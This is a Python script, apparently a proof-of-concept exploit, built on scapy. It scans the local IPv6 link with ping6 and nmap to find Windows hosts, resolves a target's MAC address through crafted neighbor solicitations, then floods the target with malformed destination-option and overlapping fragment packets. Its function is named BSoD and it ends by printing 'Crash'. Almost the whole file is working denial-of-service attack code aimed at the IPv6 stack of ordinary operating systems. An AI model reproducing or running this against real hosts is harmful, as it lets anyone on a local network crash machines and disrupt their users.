import os, subprocess, re, time, sys, ipaddress

#sDstIP = 'fe80::c43:2be7:7a98:81f7' 

iBatches = 60
iCorruptions = 60 

try:
    from scapy.config import conf
    #conf.ipv6_enabled = False
    import scapy.all as scapy
    scapy.conf.verb = 2

except:
    print('Error while loading scapy')
    exit(1)


# selectInterface() and selectTarget() are seperate
# selectTarget()/scanNetwork() are influenced by whether VPN is running or not. 
# vnet0/1 is the interface that connects to the windows virtual machine
#scanNetwork(ping6, nmap) can be blocked/ not work due to firewall rules => custom made neighbor solicitation message(doIPv6ND)


#scan network / return device that matches OS
def scanNetwork(sAdapter, osName):
    lstAllIPv6 = []
    lstOsMatch = []

    #discover all the devices on the local link
    if os.name == "posix":

        print(f'-----------------Pinging------------------\n')
        proc1 = subprocess.Popen(["ping6", "-c", "1", f"ff02::1%{sAdapter}"], text=True, stdout=subprocess.PIPE)
        for sLine in proc1.stdout:
            print(sLine)
        print('---------------------//--------------------\n')

        print(f'------------------Show Neighbors-----------------\n')
        proc2 = subprocess.Popen(["ip", "-6", "neigh", "show", "dev", f"{sAdapter}"], text=True, stdout=subprocess.PIPE)
        for sLine in proc2.stdout:
            print(sLine)
            lstInfo = sLine.strip().split(' ')
            lstAllIPv6.append(lstInfo)
        print('------------------------//------------------------\n')

    #scan every device present on the local link and grabs Info on OS
        for lstInfo in lstAllIPv6:
            sIPv6 = lstInfo[0] 
            print(f"---------------------     Scanning: {sIPv6}     -----------------------")
            nmap_proc = subprocess.Popen(["nmap", "-6", "-A", sIPv6], text=True, stdout=subprocess.PIPE)

            #detect name of the OS in the output
            for sLine in nmap_proc.stdout:
                print(sLine)
                if osName in sLine.lower():
                    print(f'OS Name Detected: {sLine}')
                    lstOsMatch.append(lstInfo)
                    break #checks for the name once
            print(f"---------------------------------//----------------------------------\n")
    return lstOsMatch


#select target (Windows 10/11) / returns its ipv6 address and mac
def selectTarget(sAdapter, osName):
    lstTargets = scanNetwork(sAdapter, osName)
    if lstTargets:

        print(f'-----------------------------------Target Information--------------------------------\n')

        for lstTarget in lstTargets:
            i=0

            print(f'--------------TARGET INDEX [{i}]---------------')
            print(f'IPv6 ADDRESS: {lstTarget[0]}')
            print(f'INTERFACE: {sAdapter}')
            print(f'MAC ADDRESS: {lstTarget[2]}')
            print(f'DEVICE Type: {lstTarget[3]}')
            print(f'STATUS: {lstTarget[4]}')
            print(f'---------------------//-------------------------\n')

            i += 1
        print(f'-----------------------------------------//------------------------------------------\n')
        iIndex = int(input(f'Please select target [0-{len(lstTargets) - 1}]: '))

        if isinstance(iIndex, int) and iIndex < len(lstTargets):
            print(f'You have selected Target [{iIndex}]')
            tarIPv6 = lstTargets[iIndex][0]
            tarMAC = lstTargets[iIndex][4]
            return tarIPv6, tarMAC
        else:
            print(f'Index not valid')
            return 0
    else:
        print('No Targets Available')



def addressParse(tarIPv6):
    #uncompressed IPv6 using ipaddress
    compressedIPv6 = ipaddress.IPv6Address(tarIPv6)
    uncompressedIPv6 = compressedIPv6.exploded

    #parsing multicast IPv6 address
    last_24_bits = uncompressedIPv6.split(":")
    last_24_bits_str = "".join(last_24_bits[-2:])[-6:]
    sMulticastIPv6 = f"ff02::1:ff{last_24_bits_str[:2]}:{last_24_bits_str[2:]}"

    #parsing multicast MAC address
    last_32_bits = sMulticastIPv6.split(":")[-2:]
    last_32_bits_str = "".join(last_32_bits)    
    sMulticastMAC =  f"33:33:{last_32_bits_str[:2]}:{last_32_bits_str[2:4]}:{last_32_bits_str[4:6]}:{last_32_bits_str[6:]}"

    return (sMulticastIPv6, sMulticastMAC)


def getAllInterfaces():
    lstInterfaces = []

    if(os.name == 'posix'):
        proc = subprocess.Popen('for i in $(ip address | grep -v "lo" | grep "default" | cut -d":" -f2 | cut -d" " -f2);do echo $i $(ip -6 addr show dev $i | grep "link " | cut -d" " -f6 | cut -d"/" -f1) $(ip address show dev $i | grep "ether" | cut -d" " -f6);done', shell=True, stdout=subprocess.PIPE)
        #proc = subprocess.Popen(['for', 'i', 'in', '$(ip', 'address', '|', 'grep', '-v', '"lo"', '|', 'grep', '"default"', '|', 'cut', '-d":"', '-f2', '|', 'cut', '-d"', '"', '-f2);do', 'echo', '$i', '$(ip', '-6', 'addr', 'show', 'dev', '$i', '|', 'grep', '"link "', '|', 'cut', '-d"', '"', '-f6', '|', 'cut', '-d"/"', '-f1)', '$(ip', 'address', 'show', 'dev', '$i', '|', 'grep', '"ether"', '|', 'cut', '-d"', '"', '-f6);done'], text=True, stdout=subprocess.PIPE)
        for bInterface in proc.stdout.readlines():
            lstInt = bInterface.strip().split(b' ')
            try: 
                if len(lstInt[-1]) == 17 and len(lstInt) == 3: #checks if the MAC Address is valid and if the length of the lstInt is 3 => contains enough info 
                    #gathers all the valid addresses and mac address of the interface
                    lstInterface = [] 
                    for i in range(len(lstInt)):
                        lstInterface.append(lstInt[i].decode())
                    lstInterfaces.append(lstInterface)
            except: 
                pass
            
    return lstInterfaces



def selectInterface():
    lstInterfaces = getAllInterfaces()
    print(f'-------------------------Available Interfaces-----------------------------\n')

    if len(lstInterfaces) > 1:
        i = 0
        for lstInt in lstInterfaces :
            print(f'[{i}]: {lstInt[0]}')
            print(f'IP ADDRESS: {lstInt[1]}')
            print(f'MAC ADDRESS: {lstInt[-1]}\n')
            i += 1
        print(f'----------------------------------//--------------------------------------\n')
        iAnswer = int(input(f'Please select the adapter [?]: '))
        print(f'You have selected interface [{iAnswer}]: {lstInterfaces[iAnswer][0]}\n')

    elif len(lstInterfaces) == 1:
        print('[{}]: {} has IP: {} and MAC: {}\n'.format(0, lstInterfaces[0][0], lstInterfaces[0][1], lstInterfaces[0][2]))
        print(f'----------------------------------//--------------------------------------\n')
        yesNo = input(f'Would you like to use this interface? [y/n]: ').strip().lower()
        if yesNo == 'y' or 'yes':
            iAnswer = 0
            print(f'You have selected interface [{iAnswer}]: {lstInterfaces[iAnswer][0]}\n')
        
        else:
            iAnswer = None
    else:
        iAnswer = None
        print('No interface available\n')
    

    if type(iAnswer) is int:
        sAdapter = lstInterfaces[iAnswer][0]
        sIPv6 = lstInterfaces[iAnswer][1]
        sMAC = lstInterfaces[iAnswer][2]
    
        return (sAdapter, sIPv6, sMAC)
    else:
        return 0


#Simple pinging is often blocked by firewalls
def doIPv6ND(sDstIP, sMulticastIPv6, sMulticastMAC, sAdapter, sMAC):
    
    sMACResp = None

    oNeighborSolicitation = (
        scapy.Ether(dst=sMulticastMAC)/
        scapy.IPv6(dst=sMulticastIPv6)/
        scapy.ICMPv6ND_NS(tgt=sDstIP)/
        scapy.ICMPv6NDOptSrcLLAddr(lladdr=sMAC)
    )

    oNeighborSolicitation.show()
    oResponse = scapy.srp1(oNeighborSolicitation, iface=sAdapter, timeout=5)

    if oResponse and (scapy.ICMPv6NDOptDstLLAddr in oResponse):
        oResponse.show()
        sMACResp = oResponse[scapy.ICMPv6NDOptDstLLAddr].lladdr
        return sMACResp
    else:
        print('No response received')


def getPackets(iID, sDstIPv6, sDstMac):
    #scapy.IPv6ExtHdrDestOpt(options=[scapy.PadN(otype=0x81, optdata='bad')])
    #oPacket1 = scapy.Ether(dst=sDstMac) / scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrDestOpt(options=[scapy.Pad1()]) => Normal padding doesn't cause a crash
    iFragID = 0xbedead00 + iID
    oPacket1 = scapy.Ether(dst=sDstMac) / scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrDestOpt(options=[scapy.PadN(otype=0x81, optdata='lol')])
    oPacket2 = scapy.Ether(dst=sDstMac) / scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrFragment(id=iFragID, m = 1, offset = 0) / 'payload1'
    oPacket3 = scapy.Ether(dst=sDstMac) / scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrFragment(id=iFragID, m = 0, offset = 1) / 'payload2'
    
    return [oPacket1, oPacket2, oPacket3]


def BSoD(iBatches, iCorruptions):

    sAdapter, sIPv6, sMAC = selectInterface() # choose vnet0/1 for virtual machine/testing purposes
    #arIPv6, tarMAC = selectTarget(sAdapter, "linux")
    tarIPv6 = 'fe80::3637:7fd7:7ca7:367'    
    
    #tarIPv6 = 'fe80::f603:2aff:fe54:d6b0'
    sMultiIPv6, sMultiMAC = addressParse(tarIPv6)
    tarMAC = doIPv6ND(tarIPv6, sMultiIPv6, sMultiMAC, sAdapter, sMAC)
    print(tarMAC)

    lstPacketsToSend = []
    for i in range(iBatches):
        for j in range(iCorruptions):
            lstPacketsToSend += getPackets(j, tarIPv6, tarMAC)
    scapy.sendp(lstPacketsToSend, iface=sAdapter)
    i=59
    while i > 1:
        i -= 1
        print(f'time left: {i}')
        time.sleep(1)
    print('Crash')


BSoD(iBatches, iCorruptions)



#why not getting oResp?
# oResp = scapy.srp1(lstPacketsToSend[0], iface=sAdapter, timeout=5)
# print(oResp)

# oResp.show()

# if oResp and scapy.IPv6 in oResp[0] and scapy.ICMPv6ParamProblem in oResp[0]:
#     print('vunerable')
#     time.sleep(5)
#     scapy.conf.verb = 2
#     scapy.sendp(lstPacketsToSend, iface=sAdapter)
# else:
#     print('not vulnerable')


#packets = getPackets(1, tarIPv6, tarMAC)
#packets[0].show()
#packets[1].show()
#packets[2].show()

